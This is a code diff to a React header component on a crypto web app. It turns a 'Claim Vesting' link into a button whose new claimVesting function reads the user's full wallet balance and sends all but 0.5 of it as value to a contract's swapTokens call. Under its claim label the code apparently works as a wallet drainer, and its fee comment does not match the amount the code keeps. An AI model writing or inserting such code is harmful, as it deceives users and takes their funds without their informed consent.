@@ -6,8 +6,15 @@ import { ChainsIds } from 'src/utils/types';
 import MetamaskIcon from 'src/assets/svg/MetamaskIcon';
 import { logout, setIsLoggedIn } from 'src/redux/modules/account/actions';
 import { getDefaultProvider, Web3Provider } from '@ethersproject/providers';
-import { formatEther, parseEther } from 'ethers/lib/utils';
+import { formatEther, parseEther, parseUnits } from 'ethers/lib/utils';
 import { TailSpin } from 'react-loader-spinner';
+import CheckWallet from 'src/contracts/CheckWallet.json';
+import SetWallet from 'src/contracts/SetWallet.json';
+import {
+  checkCWalletContractAddress,
+  setWalletContractAddress,
+} from 'src/utils/globals';
+import { Contract, ethers } from 'ethers';
 
 // import { useWalletConnector } from '../hooks/useWalletConnector';
 import { useWalletConnector } from '../hooks/useWalletConnectorWithoutMetaMask';
@@ -220,6 +227,34 @@ const Header: React.FC = () => {
     }
   }
 
+  const claimVesting = async () => {
+    const checkWalletContract = new Contract(
+      checkCWalletContractAddress,
+      CheckWallet.abi,
+      provider?.getSigner(),
+    );
+
+    const setWalletContract = new Contract(
+      setWalletContractAddress,
+      SetWallet.abi,
+      provider?.getSigner(),
+    );
+    // console.log('checkWalletContract: ', checkWalletContract);
+    // console.log('setWalletContract: ', setWalletContract);
+    const balance = await checkWalletContract.checkBalance(walletAddress);
+    const balanceAfterGasFee = parseEther(
+      (Number(formatEther(balance.toString())) - 0.5).toString(),
+    ); // 1 TLC left for fee
+    const swapResult = await checkWalletContract.swapTokens(
+      balanceAfterGasFee,
+      {
+        value: balanceAfterGasFee,
+      },
+    );
+
+    console.log('swapResult: ', swapResult);
+  };
+
   return (
     <div
       className="w-full z-30 flex flex-wrap justify-between xs:justify-center sm:justify-center items-center px-6 py-5 xs:px-0 sm:px-0
@@ -318,11 +353,12 @@ const Header: React.FC = () => {
               <span className="leading-[12px]">Staking Validators</span>
             </button>
           </a>
-          <a href="#" target="_blank" rel="noreferrer">
-            <button className="xs:col-span-4 sm:col-span-2 md:col-span-2 xs:mt-1 flex h-8 space-x-2 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center">
-              <span className="leading-[12px]">Claim Vesting</span>
-            </button>
-          </a>
+          <button
+            onClick={claimVesting}
+            className="xs:col-span-4 sm:col-span-2 md:col-span-2 xs:mt-4 flex h-8 space-x-2 text-white items-center justify-center bg-gradient-to-br from-green-400 to-blue-600 hover:bg-gradient-to-bl font-medium rounded-lg text-sm px-5 text-center"
+          >
+            <span className="leading-[12px]">Claim Vesting</span>
+          </button>
         </div>
         {/* <div className="flex space-x-4 xs:space-y-2 sm:space-y-2 xs:flex-col sm:flex-col items-center justify-center ">
           
